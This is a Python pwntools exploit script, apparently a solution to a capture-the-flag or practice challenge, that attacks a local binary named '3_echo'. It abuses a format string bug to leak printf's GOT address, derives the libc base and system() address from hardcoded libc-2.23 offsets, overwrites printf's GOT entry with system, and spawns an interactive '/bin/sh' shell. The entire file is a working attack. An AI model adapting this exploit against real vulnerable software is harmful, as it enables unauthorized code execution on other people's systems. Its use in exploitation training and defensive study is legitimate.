#!/usr/bin/python

from pwn import *

binary = "./3_echo"
p = process(binary)

def main():
	# Reference:
	# No Aslr: $2 = {<text variable, no debug info>} 0xf7e74ca0 <puts>

	# Printf GOT:
	# 0804a010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
	printf_GOT = 0x0804a010

	#fmt_str = "AAAA%57$p" 
	fmt_leak = p32(printf_GOT) + "%57$s"

	p.sendline(fmt_leak) # Stores our format string in the buffer			
	log.info("Stored format strings in the buffer.")
	skip_and_repeat()

	# hexdump ./dumpfile
	leak = p.recv(8) # First 4 bytes: printf@GOT, Last 4 bytes: printf_addr
	leak = leak[4:] # We are only interested in the last four bytes
	printf_addr = u32(leak)
	log.info("Printf address : 0x%x" % printf_addr)

	# hexdump dumpfile
	# 0000000 4ca0 f7e7
	fname = 'dumpfile' 
	with open(fname, 'w') as f:
		f.write(leak)

	# For reference:
	# objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep "<_IO_printf@@GLIBC_2.0>:"
	# 00049670 <_IO_printf@@GLIBC_2.0>:
	printf_offset = 0x00049670

	# For reference:
	# objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep "<_IO_puts@@GLIBC_2.0>:"
	# 0005fca0 <_IO_puts@@GLIBC_2.0>:

	# Determine libc base addr
	libc_base_addr = printf_addr - printf_offset
	log.info("Libc base addr : 0x%x" % libc_base_addr) 	

	# For reference:
	# No Aslr: $3 = {<text variable, no debug info>} 0xf7e4fda0 <system>

	# Determine system offset
	# objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep "<__libc_system@@GLIBC_PRIVATE>"
	# 0003ada0 <__libc_system@@GLIBC_PRIVATE>:
	system_offset = 0x0003ada0

	# Determine system address
	system_addr = libc_base_addr + system_offset	
	log.info("System addr : 0x%x" % system_addr)

	# For reference:
	# payload = fmtstr_payload(5, {token_addr: 0xcafebabe})

	# Overwrites printf() GOT with system()
	fmt_write = fmtstr_payload(57, { printf_GOT: system_addr })
	p.sendline(fmt_write)
	log.warn("printf() overwritten with system()")
	
	skip_and_repeat()

	cmd = "/bin/sh".ljust(999, "\x00") 
	p.sendline(cmd)	# Stores /bin/sh in buffer

	skip_and_repeat()
	log.success("Popped shell :)")

	p.interactive()

def skip_and_repeat():
	skip_prompt()
	repeat_once()

def skip_prompt():
	time = 0.2 
	p.recvrepeat(time)

def repeat_once():
	p.sendline("1")

if __name__ == "__main__":
	main()
